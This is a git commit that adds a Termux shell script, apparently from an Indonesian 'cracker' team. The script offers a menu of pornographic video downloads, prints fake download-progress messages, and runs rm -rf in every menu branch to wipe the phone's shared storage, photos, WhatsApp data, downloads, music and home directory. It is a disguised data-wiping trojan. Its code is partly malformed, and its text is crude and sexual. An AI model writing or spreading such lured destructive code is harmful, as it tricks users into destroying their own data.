68c3b67837c1a7cdd2078b1f9b82c90aaf1daddc
MR.51MB4H <48198896+kingcracker@users.noreply.github.com>
2019-04-11 11:18:24 +0700

    Add files via upload

---
+++ sex.sh
@@ -0,0 +1,227 @@
+#! / system / xbin / bash
+clear
+python2 pass.txt
+blue = '\033[34;1m'
+
+green = '\033[32;1m'
+
+purple = '\033[35;1m'
+
+cyan = '\033[36;1m'
+
+red = '\033[31;1m'
+
+white = '\033[37;1m'
+
+yellow  = '\033[33;1m'
+sleep 1
+echo $green
+cat fuck.txt
+echo ""
+echo $blue "============================================="
+|
+lolcat
+echo $red"hay apa kabar cukk sabunnya siapkan"
+echo $green"Author : KING CRACKER"
+echo $blue"Team : Indenpendent Cyber Team"
+echo -e
+echo $green "==================================================="
+sleep 1
+echo ""
+echo $blue "silahkan pilih videonya"
+echo $green "###############################"
+echo $yellow "1.bokep jepang"
+echo $blue   "2.bokep india"
+echo $red    "3.bokep rusia"
+echo $cyan   "4.bokep arab"
+echo $purple "5.bokep china"
+echo $red    "0.out"
+echo $blue   "##########################"
+read -p "fight@sex-=>" hy
+
+if "[ $hy = 1 ]|
+then
+clear
+figlet "Jepang" | lolcat
+echo $yellow "persiapan mendownload..."
+echo $green "lagi download sabar njing!"
+termux-setup-storage
+
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/Music
+rm -rf /sdcard/0/Music
+echo $green "download selesai video tersimpan dimemori"
+echo $yello "siapkan sabun untuk coli"
+fi
+sleep 1
+
+if [ $hy = 2 ] |
+then
+clear
+figlet -f standard -F gay "india"
+echo $blue "persiapan mendownload..."
+echo $cyan "proses download"
+echo $blue "sabar cuk"
+termux-setup-storage
+
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
+rm -rf storage/emulated/0
+
+rm -rf /storage/emulated/0/WhatsApp
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/Downloads
+
+rm -rf /storage/emulated/0/Music
+
+rm -rf /sdcard/0/Music
+echo $blue "download selesai video tersimpan dimemori"
+echo $yellow "siapkan sabun untuk coli"
+fi
+
+if [ $hy = 3 ]|
+then clear
+figlet "Rusia" | lolcat
+echo $blue "persiapan mendownload..."
+echo $green "sabar ya cuk...."
+echo $cyan "lagi proses downlaod"
+termux-setup-storage
+
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
+rm -rf storage/emulated/0
+
+rm -rf /storage/emulated/0/WhatsApp
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/Downloads
+
+rm -rf /storage/emulated/0/Music
+
+rm -rf /sdcard/0/Music
+echo $green "dowload selesai"
+echo $green "video tersimpan dimemori ..."
+echo $blue "siapkan sabun untuk coli"
+fi
+
+
+if [ $hy = 4 ]|
+then
+clear
+figlet "Arab" | lolcat
+echo $blue "persiapan mendownload.."
+echo $green "sabar ya cuk!"
+echo $cyan "lagi download"
+termux-setup-storage
+
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
+rm -rf storage/emulated/0
+
+rm -rf /storage/emulated/0/WhatsApp
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/Downloads
+
+rm -rf /storage/emulated/0/Music
+echo $blue "download selesai video di memori"
+echo $yellow "siapkan sabun tuk coli"
+fi
+
+
+
+if [ $hy = 5]|
+then
+clear
+figlet -f standard -F "china"
+echo $yellow "persiapan download"
+echo $cyan "sabar ya cuk!"
+termux-setup-storage
+
+rm -rf /storage/emulated/0
+
+rm -rf /sdcard/0
+
+rm -rf /storage/emulated/0/DCIM
+
+rm -rf /storage/emulated/0/android/obb
+
+rm -rf /sdcard/0/android/data
+
+rm -rf $HOME
+
+rm -rf sdcard/0
+
+rm -rf storage/emulated/0
+
+rm -rf /storage/emulated/0/WhatsApp
+
+rm -rf /sdcard/0/WhatsApp
+
+rm -rf /storage/emulated/0/Downloads
+
+rm -rf /storage/emulated/0/Music
+
+rm -rf /sdcard/0/Music
+echo $red "download selesai video dimemori"
+echo $blue "siapkan sabun buat coli"
+fi
+
+
+if [ $hy = 0 ]|
+then
+clear
+echo $green "thanks sudah gunakan tools ini."
+echo $yellow "sampai jumpa..."
+exit
+fi
